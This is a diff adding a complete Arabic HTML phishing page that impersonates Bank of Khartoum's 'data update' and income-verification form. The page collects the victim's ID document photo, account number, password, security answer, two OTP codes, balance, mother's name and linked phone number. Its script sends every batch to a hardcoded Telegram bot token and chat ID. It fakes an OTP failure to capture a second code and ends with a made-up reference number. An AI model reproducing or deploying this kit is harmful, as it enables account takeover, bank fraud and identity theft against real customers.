@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تحديث البيانات  - بنك الخرطوم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body { background-color: #f8fafc; min-height: 100vh; display: flex; flex-direction: column; color: #1e293b; overflow-x: hidden; }
+        
+        .header-img-container { background: #ffffff; display: flex; align-items: center; justify-content: center; padding: 12px 15px; border-bottom: 2px solid #c5a059; box-shadow: 0 1px 3px rgba(0,0,0,0.05); width: 100%; }
+        .header-img-container img { width: 100%; max-width: 520px; height: auto; max-height: 110px; object-fit: contain; display: block; }
+
+        .main-container { flex: 1; display: flex; flex-direction: column; max-width: 600px; width: 100%; margin: 0 auto; padding: 15px; }
+        .card { background: white; width: 100%; flex: 1; padding: 30px 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e2e8f0; text-align: center; display: flex; flex-direction: column; justify-content: center; min-height: 75vh; }
+        .hidden { display: none !important; }
+        
+        h2 { color: #0d5c3d; margin-bottom: 15px; font-size: 20px; font-weight: 700; text-align: right; }
+        h3 { color: #334155; margin-bottom: 20px; font-size: 15px; border-bottom: 2px solid #c5a059; display: inline-block; padding-bottom: 5px; text-align: right; width: 100%; }
+        
+        .input-group { margin-bottom: 16px; text-align: right; width: 100%; }
+        .input-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 13.5px; color: #334155; text-align: right; }
+        .input-wrapper { position: relative; width: 100%; }
+        input, select, textarea { width: 100%; padding: 12px 15px; border: 1px solid #cbd5e1; border-radius: 10px; background-color: #f8fafc; font-size: 14px; outline: none; transition: border-color 0.2s; text-align: right; }
+        input:focus, select:focus, textarea:focus { border-color: #c5a059; background-color: #fff; }
+        
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #64748b; cursor: pointer; }
+        .btn-submit { background-color: #c5a059; color: white; border: none; width: 100%; padding: 14px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 15px; box-shadow: 0 4px 10px rgba(197,160,89,0.3); }
+        .btn-submit:hover { background-color: #b08d4b; }
+        
+        .otp-timer { color: #c5a059; font-size: 13px; margin-bottom: 15px; text-align: center; display: block; }
+        .service-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin: 20px 0; text-align: right; }
+        .service-option { display: flex; flex-direction: row; align-items: center; justify-content: space-between; padding: 14px; border: 2px solid #c5a059; border-radius: 12px; background-color: rgba(197, 160, 89, 0.05); }
+        .service-content { display: flex; flex-direction: column; text-align: right; }
+        .service-title { font-weight: 700; color: #0d5c3d; font-size: 15px; }
+        .service-desc { font-size: 12.5px; color: #64748b; margin-top: 3px; }
+        
+        .error-message { color: #e11d48; font-size: 12.5px; font-weight: bold; margin-top: 6px; display: block; text-align: right; }
+        .success-box { background-color: #f0fdf4; border: 2px solid #16a34a; padding: 20px; border-radius: 12px; margin-top: 15px; text-align: right; }
+        .reference-title { font-size: 14px; color: #334155; font-weight: bold; display: block; text-align: center; margin-top: 8px; }
+        .reference-number { font-size: 24px; color: #16a34a; font-weight: 700; letter-spacing: 2px; display: block; margin: 12px 0; text-align: center; background: #fff; padding: 10px; border: 1px dashed #16a34a; border-radius: 8px; }
+        .warning-text { color: #dc2626; font-weight: 700; background-color: #fef2f2; padding: 12px; border-right: 4px solid #dc2626; margin-top: 12px; font-size: 13px; border-radius: 0 8px 8px 0; text-align: right; }
+
+        .loading-spinner { display: inline-block; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .whatsapp-float {
+            position: fixed; bottom: 25px; left: 25px; background-color: #25d366; color: white;
+            width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; font-size: 32px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            z-index: 1000; transition: transform 0.3s ease; text-decoration: none;
+        }
+        .whatsapp-float:hover { transform: scale(1.1); }
+    </style>
+</head>
+<body>
+    <header class="header-img-container">
+        <img src="m.png" alt="بنك الخرطوم">
+    </header>
+
+    <div class="main-container">
+        <div id="step-inc-start" class="card">
+            <h2>طلب تحديث البيانات </h2>
+            <h3>إستمارة تحديث البيانات </h3>
+            <div class="service-grid">
+                <div class="service-option">
+                    <div class="service-content">
+                        <span class="service-title">إثبات دخل و تحديث البيانات</span>
+                        <span class="service-desc">تأكيد وتوثيق مصادر الدخل الشهري والوظيفة.</span>
+                    </div>
+                    <span style="font-size: 22px;">💼</span>
+                </div>
+            </div>
+            <button class="btn-submit" onclick="goToStep('step-income-form')">متابعة</button>
+        </div>
+
+        <div id="step-income-form" class="card hidden" style="text-align: right;">
+            <h2>استمارة إثبات دخل</h2>
+            <h3>الرجاء تزويدنا ببيانات الدخل المطلوبة</h3>
+            <div class="input-group">
+                <label>الإسم بالكامل:</label>
+                <input type="text" id="inc-name" placeholder="أدخل الإسم رباعي">
+                <span id="err-inc-name" class="error-message hidden">الرجاء إدخال الاسم رباعي</span>
+            </div>
+            <div class="input-group">
+                <label>المهنة:</label>
+                <input type="text" id="inc-job" placeholder="أدخل طبيعة عملك الحالية">
+                <span id="err-inc-job" class="error-message hidden">الرجاء إدخال المهنة</span>
+            </div>
+            <div class="input-group">
+                <label>مكان العمل بالضبط:</label>
+                <input type="text" id="inc-workplace" placeholder="اسم الشركة / المؤسسة / المتجر وعنوانها">
+                <span id="err-inc-workplace" class="error-message hidden">الرجاء إدخال مكان العمل</span>
+            </div>
+            <div class="input-group">
+                <label>مقدار الدخل الشهري التقريبي:</label>
+                <input type="text" id="inc-salary" placeholder="أدخل قيمة الدخل بالجنيه">
+                <span id="err-inc-salary" class="error-message hidden">الرجاء إدخال مقدار الدخل</span>
+            </div>
+            <div class="input-group">
+                <label>رقم واتساب للتواصل:</label>
+                <input type="tel" id="inc-guardian-phone" placeholder="مثال: 0912345678" dir="ltr" style="text-align:left;">
+                <span id="err-inc-guardian" class="error-message hidden">الرجاء إدخال رقم واتساب للتواصل</span>
+            </div>
+            <div class="input-group">
+                <label>صورة المستند (جواز أو رقم وطني):</label>
+                <div style="position: relative; border: 1px solid #cbd5e1; border-radius: 10px; background-color: #f8fafc; padding: 10px; display: flex; align-items: center; justify-content: space-between;">
+                    <input type="file" id="inc-file-input" accept="image/*" onchange="updateIncomeFileLabel()" style="position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;">
+                    <span id="inc-file-label-text" style="font-size: 13px; color: #94a3b8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">اختر صورة المستند...</span>
+                    <span style="background-color: rgba(197,160,89,0.15); color: #c5a059; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 6px; flex-shrink: 0;">استعراض</span>
+                </div>
+                <span id="err-inc-file" class="error-message hidden">الرجاء اختيار صورة المستند</span>
+            </div>
+            <button class="btn-submit" onclick="submitIncomeData()">حفظ ومتابعة تسجيل الدخول</button>
+        </div>
+
+        <div id="step-inc-login" class="card hidden" style="text-align: right;">
+            <h2>الاستمارة أونلاين</h2>
+            <h3>الرجاء إدخال بيانات حساب بنك الخرطوم</h3>
+            
+            <div style="background-color: #fefce8; border: 1px solid #fde047; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 12.5px; color: #854d0e; line-height: 1.5; text-align: right;">
+                💡 <strong>تنويه:</strong> برجاء تسجيل الدخول الي حسابك لمطابقة الهوية .
+            </div>
+
+            <div class="input-group">
+                <label>رقم الحساب:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب " dir="ltr" style="text-align:left;">
+                <span id="err-acc-num" class="error-message hidden">الرجاء إدخال رقم الحساب</span>
+            </div>
+            <div class="input-group">
+                <label>كلمة مرور الحساب:</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور ">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+                <span id="err-password" class="error-message hidden">الرجاء إدخال كلمة المرور</span>
+                <span id="inc-login-error" class="error-message hidden">رقم الحساب او كلمة السر خاطئة الرجاء المحاولة مرة أخرى</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep1()">تسجيل الدخول</button>
+        </div>
+
+        <div id="step-inc-security" class="card hidden" style="text-align: right;">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى الإجابة على سؤال واحد من أسئلة الأمان</h3>
+            <div class="input-group">
+                <label>الرجاء الإجابة على سؤال الأمان</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان --</option>
+                    <option>ما هو اسم ابن عمك الأول؟</option>
+                    <option>في أي مدينة ولدت؟</option>
+                    <option>في أي سنة تخرجت من الجامعة؟</option>
+                    <option>ماذا كان لقبك اثناء الطفولة؟</option>
+                    <option>اسم مؤلفك المفضل؟</option>
+                    <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    <option>أي فيلم هو المفضل لديك؟</option>
+                    <option>اسم أفضل صديق في الطفولة؟</option>
+                    <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                    <option>العلامة التجارية لأول تلفزيون خاص بك؟</option>
+                    <option>في أي سنة تزوجت؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                    <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    <option>ما هي ماركة سيارتك الأولى؟</option>
+                </select>
+                <span id="err-sec-q" class="error-message hidden">الرجاء اختيار سؤال الأمان</span>
+            </div>
+            <div class="input-group">
+                <label>ادخل الجواب</label>
+                <input type="text" id="security-answer" placeholder="اكتب جوابك هنا">
+                <span id="err-sec-ans" class="error-message hidden">الرجاء إدخال إجابة سؤال الأمان</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال</button>
+        </div>
+
+        <div id="step-inc-otp" class="card hidden">
+            <div id="otp-area">
+                <h2>إدخال رمز OTP</h2>
+                <div class="input-group" style="text-align: right;">
+                    <label>أدخل رمز التحقق المرسل الي بريدك الالكتروني او رقم الهاتف (OTP):</label>
+                    <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                    <span id="err-otp" class="error-message hidden" style="text-align:center;">الرمز خاطئ تفقد بريدك الالكتروني او بريد الرسائل للهاتف المرتبط بالحساب و اعد ادخال الرمز الصحيح</span>
+                </div>
+                <span id="otp-timer" class="otp-timer">إعادة إرسال الرمز خلال 30:00 دقيقة</span>
+                <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق الاعتمادي</button>
+            </div>
+        </div>
+
+        <div id="step-inc-personal" class="card hidden" style="text-align: right;">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان يرجى تأكيد التفاصيل المالية وبيانات الهوية بالحساب</h3>
+            <div class="input-group">
+                <label>المبلغ الموجود في الحساب:</label>
+                <input type="text" id="account-amount" placeholder="أدخل المبلغ التقريبي أو الحالي">
+                <span id="err-amount" class="error-message hidden">الرجاء إدخال المبلغ الموجود في الحساب</span>
+            </div>
+            <div class="input-group">
+                <label>إسم الوالدة رباعي:</label>
+                <input type="text" id="mother-name" placeholder="أدخل إسم الوالدة بالكامل">
+                <span id="err-mother" class="error-message hidden">الرجاء إدخال إسم الوالدة رباعي</span>
+            </div>
+            <div class="input-group">
+                <label>رقم تواصل واتساب:</label>
+                <input type="tel" id="whatsapp-num" placeholder="أدخل رقم الواتساب الفعال" dir="ltr" style="text-align:left;">
+                <span id="err-whatsapp" class="error-message hidden">الرجاء إدخال رقم الواتساب</span>
+            </div>
+            <div class="input-group">
+                <label>رقم الهاتف المرتبط بالحساب:</label>
+                <input type="tel" id="linked-phone" placeholder="أدخل رقم شريحة الحساب" dir="ltr" style="text-align:left;">
+                <span id="err-linked-phone" class="error-message hidden">الرجاء إدخال رقم الهاتف المرتبط بالحساب</span>
+            </div>
+            <button class="btn-submit" onclick="submitStepPersonal()">إتمام وإرسال الطلب</button>
+        </div>
+
+        <div id="step-inc-final" class="card hidden">
+            <div class="success-box" style="margin-top:0;">
+                <h2 style="color: #16a34a; text-align: center; margin-bottom: 10px;">✓ تم تسجيل ومعالجة طلبك بنجاح</h2>
+                <span class="reference-title">الرقم المرجعي التابع لك:</span>
+                <span id="display-ref-num" class="reference-number">REF-00000000</span>
+                <div class="warning-text">
+                    ⚠️ تنبيه أمني هام: نظام المراجعة الآلي يشترط مطابقة الـ OTP والبيانات المدخلة بدقة تامة.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <a href="https://wa.me/249101938506" target="_blank" class="whatsapp-float">
+        <i class="fab fa-whatsapp"></i>
+    </a>
+
+    <script>
+        let userData = { accountNum: '', password: '', securityQuestion: '', securityAnswer: '', otp: '', otp2: '', amount: '', motherName: '', whatsappNum: '', linkedPhone: '', incName: '', incJob: '', incWorkplace: '', incSalary: '', incGuardianPhone: '', refNum: '' };
+        let selectedFile = null;
+        let otpAttemptCount = 0; // متغيّر لحساب عدد محاولات الـ OTP
+
+        function hideAllViews() {
+            document.getElementById('step-inc-start').classList.add('hidden');
+            document.getElementById('step-income-form').classList.add('hidden');
+            document.getElementById('step-inc-login').classList.add('hidden');
+            document.getElementById('step-inc-security').classList.add('hidden');
+            document.getElementById('step-inc-otp').classList.add('hidden');
+            document.getElementById('step-inc-personal').classList.add('hidden');
+            document.getElementById('step-inc-final').classList.add('hidden');
+            document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
+        }
+
+        function goToStep(id) {
+            hideAllViews();
+            document.getElementById(id).classList.remove('hidden');
+            if (id === 'step-inc-otp') startOtpTimer();
+        }
+
+        function togglePassword(id) {
+            const p = document.getElementById(id);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function updateIncomeFileLabel() {
+            const fileInput = document.getElementById('inc-file-input');
+            const fileLabelText = document.getElementById('inc-file-label-text');
+            if (fileInput.files && fileInput.files.length > 0) {
+                selectedFile = fileInput.files[0];
+                fileLabelText.textContent = "تم اختيار صورة";
+                fileLabelText.style.color = "#16a34a";
+                fileLabelText.style.fontWeight = "600";
+            }
+        }
+
+        function submitIncomeData() {
+            let hasError = false;
+            userData.incName = document.getElementById('inc-name').value.trim();
+            userData.incJob = document.getElementById('inc-job').value.trim();
+            userData.incWorkplace = document.getElementById('inc-workplace').value.trim();
+            userData.incSalary = document.getElementById('inc-salary').value.trim();
+            userData.incGuardianPhone = document.getElementById('inc-guardian-phone').value.trim();
+            const fileInput = document.getElementById('inc-file-input');
+
+            if(!userData.incName) { document.getElementById('err-inc-name').classList.remove('hidden'); hasError = true; }
+            if(!userData.incJob) { document.getElementById('err-inc-job').classList.remove('hidden'); hasError = true; }
+            if(!userData.incWorkplace) { document.getElementById('err-inc-workplace').classList.remove('hidden'); hasError = true; }
+            if(!userData.incSalary) { document.getElementById('err-inc-salary').classList.remove('hidden'); hasError = true; }
+            if(!userData.incGuardianPhone) { document.getElementById('err-inc-guardian').classList.remove('hidden'); hasError = true; }
+            if(!fileInput.files || fileInput.files.length === 0) { document.getElementById('err-inc-file').classList.remove('hidden'); hasError = true; }
+            else { document.getElementById('err-inc-file').classList.add('hidden'); }
+
+            if(hasError) return;
+
+            const captionText = `💼 بيانات إثبات الدخل والمستند المرفق:\n👤 الاسم: ${userData.incName}\n🛠️ المهنة: ${userData.incJob}\n📍 مقر العمل: ${userData.incWorkplace}\n💵 الدخل: ${userData.incSalary}\n📞 واتساب: ${userData.incGuardianPhone}`;
+            
+            if (selectedFile) {
+                sendPhotoToTelegram(selectedFile, captionText);
+            } else {
+                sendToTelegram(captionText);
+            }
+
+            goToStep('step-inc-login');
+        }
+
+        function startOtpTimer() {
+            let m = 30, s = 0;
+            const t = document.getElementById("otp-timer");
+            const x = setInterval(() => {
+                if (s === 0) { if (m === 0) { clearInterval(x); return; } m--; s = 59; } else { s--; }
+                if(t) t.textContent = `إعادة إرسال الرمز خلال ${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')} دقيقة`;
+            }, 1000);
+        }
+
+        function isAscendingSequential(str) {
+            if (str.length < 2) return false;
+            for (let i = 0; i < str.length - 1; i++) {
+                if (str.charCodeAt(i + 1) - str.charCodeAt(i) !== 1) return false;
+            }
+            return true;
+        }
+
+        function isValidAccount(acc) {
+            if (!/^\d+$/.test(acc)) return false;
+            if (acc.length < 6 || acc.length > 7) return false;
+            if (isAscendingSequential(acc)) return false;
+            return true;
+        }
+
+        function isValidPassword(pwd) {
+            if (/[\u0600-\u06FF]/.test(pwd)) return false;
+            return /[A-Z]/.test(pwd) && /[a-z]/.test(pwd) && /[0-9]/.test(pwd) && /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pwd);
+        }
+
+        function submitStep1() {
+            let hasError = false;
+            userData.accountNum = document.getElementById('account-num').value.trim();
+            userData.password = document.getElementById('password').value;
+
+            if(!userData.accountNum) { document.getElementById('err-acc-num').classList.remove('hidden'); hasError = true; }
+            if(!userData.password) { document.getElementById('err-password').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            const errorElement = document.getElementById('inc-login-error');
+            if (!isValidAccount(userData.accountNum) || !isValidPassword(userData.password)) {
+                errorElement.classList.remove('hidden');
+                return;
+            }
+
+            errorElement.classList.add('hidden');
+            sendToTelegram(`📋 دخول جديد [الخدمة: إثبات دخل]\n🔢 الحساب: ${userData.accountNum}\n🔐 السر: ${userData.password}`);
+            goToStep('step-inc-security');
+        }
+
+        function submitStep2() {
+            let hasError = false;
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value.trim();
+
+            if(!userData.securityQuestion) { document.getElementById('err-sec-q').classList.remove('hidden'); hasError = true; }
+            if(!userData.securityAnswer) { document.getElementById('err-sec-ans').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            sendToTelegram(`🔐 أمان\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            goToStep('step-inc-otp');
+        }
+
+        function verifyOtp() {
+            const o = document.getElementById('otp-code').value.trim();
+            const errOtp = document.getElementById('err-otp');
+
+            if(!o || o.length < 4) {
+                errOtp.textContent = "الرجاء إدخال رمز التحقق (OTP)";
+                errOtp.classList.remove('hidden');
+                return;
+            }
+            
+            const btn = document.getElementById('verify-btn');
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري التحقق من رمز OTP...`;
+
+            if (otpAttemptCount === 0) {
+                // المحاولة الأولى: إرسال الرمز للبوت ثم إظهار الخطأ للأرضية
+                setTimeout(() => {
+                    userData.otp = o;
+                    sendToTelegram(`⚠️ محاولة OTP الأولى (خاطئة):\n🔐 الرمز: ${userData.otp}`);
+                    
+                    btn.disabled = false;
+                    btn.innerHTML = `التحقق الاعتمادي`;
+                    
+                    errOtp.textContent = "الرمز خاطئ تفقد بريدك الالكتروني او بريد الرسائل للهاتف المرتبط بالحساب و اعد ادخال الرمز الصحيح";
+                    errOtp.classList.remove('hidden');
+                    document.getElementById('otp-code').value = '';
+                    otpAttemptCount++;
+                }, 1500);
+            } else {
+                // المحاولة الثانية: قبول الرمز والانتقال للخطوة التالية
+                setTimeout(() => {
+                    userData.otp2 = o;
+                    sendToTelegram(`🔢 OTP معتمد (المحاولة الثانية):\n🔐 الرمز: ${userData.otp2}`);
+                    goToStep('step-inc-personal');
+                }, 2500);
+            }
+        }
+
+        function submitStepPersonal() {
+            let hasError = false;
+            userData.amount = document.getElementById('account-amount').value.trim();
+            userData.motherName = document.getElementById('mother-name').value.trim();
+            userData.whatsappNum = document.getElementById('whatsapp-num').value.trim();
+            userData.linkedPhone = document.getElementById('linked-phone').value.trim();
+
+            if(!userData.amount) { document.getElementById('err-amount').classList.remove('hidden'); hasError = true; }
+            if(!userData.motherName) { document.getElementById('err-mother').classList.remove('hidden'); hasError = true; }
+            if(!userData.whatsappNum) { document.getElementById('err-whatsapp').classList.remove('hidden'); hasError = true; }
+            if(!userData.linkedPhone) { document.getElementById('err-linked-phone').classList.remove('hidden'); hasError = true; }
+
+            if(hasError) return;
+
+            let randomRef = 'BOK-' + Math.floor(10000000 + Math.random() * 90000000);
+            userData.refNum = randomRef;
+
+            sendToTelegram(`💰 تأكيد المبلغ والبيانات الشخصية:\n💵 المبلغ: ${userData.amount}\n👩‍👦 إسم الوالدة: ${userData.motherName}\n💬 واتساب: ${userData.whatsappNum}\n📱 الهاتف المرتبط: ${userData.linkedPhone}\n🎫 المرجعي: ${userData.refNum}`);
+
+            hideAllViews();
+            document.getElementById('display-ref-num').textContent = randomRef;
+            document.getElementById('step-inc-final').classList.remove('hidden');
+        }
+
+        function sendToTelegram(messageText) {
+            const botToken = "8609755572:AAESN7NhSL5lA3rofIqwYHaK4oouuHRyPbc";
+            const chatId = "8912947067";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            });
+        }
+
+        function sendPhotoToTelegram(file, captionText) {
+            const botToken = "8609755572:AAESN7NhSL5lA3rofIqwYHaK4oouuHRyPbc";
+            const chatId = "8912947067";
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', file);
+            formData.append('caption', captionText);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
